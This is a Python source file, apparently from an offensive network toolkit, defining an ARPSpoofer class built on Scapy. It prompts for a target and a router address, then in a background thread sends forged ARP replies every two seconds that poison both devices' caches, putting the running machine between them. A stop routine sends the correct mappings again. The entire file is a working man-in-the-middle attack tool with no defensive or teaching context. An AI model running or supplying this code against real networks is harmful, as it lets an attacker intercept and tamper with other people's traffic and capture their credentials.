from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from Framework.Device.DeviceManager import IFACE, DEVICE_MAC
import tabulate

GLOBAL_INTERFACE = str(IFACE)
GLOBAL_DEVICEMAC = str(DEVICE_MAC)

class ARPSpoofer:
    def __init__(self):
        self._default = False
        self._thread = Thread(target=self._activate, daemon=True)
        self._stop = True

        self.CLIENT_IP = str("")
        self.CLIENT_MAC = str("")
        self.ROUTER_IP = str("")
        self.ROUTER_MAC = str("")

    def _getMAC(self, target_ip: str):
        if target_ip == self.CLIENT_IP and self.CLIENT_MAC:
            return self.CLIENT_MAC
        elif target_ip == self.ROUTER_IP and self.ROUTER_MAC:
            return self.ROUTER_MAC
        else:
            request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / request
            answer = srp(packet, iface=GLOBAL_INTERFACE, timeout=2, verbose=False)[0]
            if answer and len(answer[0]) > 0:
                mac = answer[0][1].hwsrc
                if target_ip == self.CLIENT_IP:
                    self.CLIENT_MAC = mac
                elif target_ip == self.ROUTER_IP:
                    self.ROUTER_MAC = mac
                return mac
            else:
                raise Exception(f"MAC address for {target_ip} not found")

    def _createSpoofPacket(self, target_ip:str, spoof_ip:str):
        mac = self._getMAC(target_ip)
        packet = ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoof_ip)
        return packet

    def _restore(self, dest, source):
        target_mac = self._getMAC(dest)
        source_mac = self._getMAC(source)
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        send(packet, iface=GLOBAL_INTERFACE, verbose=False)

    def setClientIP(self):
        '''Set target client IPv4 address'''
        self.CLIENT_IP = input("[?] Enter the target IP address: ")

    def setClientMAC(self):
        '''Set target client MAC address'''
        self.CLIENT_MAC = input("[?] Enter the target MAC address: ")

    def setRouterIP(self):
        '''Set router client IPv4 address'''
        self.ROUTER_IP = input("[?] Enter the router IP address: ")

    def setRouterMAC(self):
        '''Set router client MAC address'''
        self.ROUTER_MAC = input("[?] Enter the router MAC address: ")

    def info(self, help=False):
        '''Print all addresses in the target table.'''
        sets = [
            ["Client", self.CLIENT_IP, self.CLIENT_MAC],
            ["Router", self.ROUTER_IP, self.ROUTER_MAC]
        ]
        table = tabulate.tabulate(sets, headers=["Device", "IPv4 Address", "MAC Address"], tablefmt="pretty", colalign=("left", "left", "left"))
        print(table)

    def _activate(self):
        while True:
            if self._stop == True:
                break
            client_pkt = self._createSpoofPacket(self.CLIENT_IP, self.ROUTER_IP)
            router_pkt = self._createSpoofPacket(self.ROUTER_IP, self.CLIENT_IP)
            send(client_pkt, iface=GLOBAL_INTERFACE, verbose=False)
            send(router_pkt, iface=GLOBAL_INTERFACE, verbose=False)
            time.sleep(2)

    def start(self):
        self._thread = Thread(target=self._activate, daemon=True)
        self._stop = False
        self._thread.start()

    def stop(self):
        self._restore(self.ROUTER_IP, self.CLIENT_IP)
        self._restore(self.CLIENT_IP, self.ROUTER_IP)
        self._stop = True
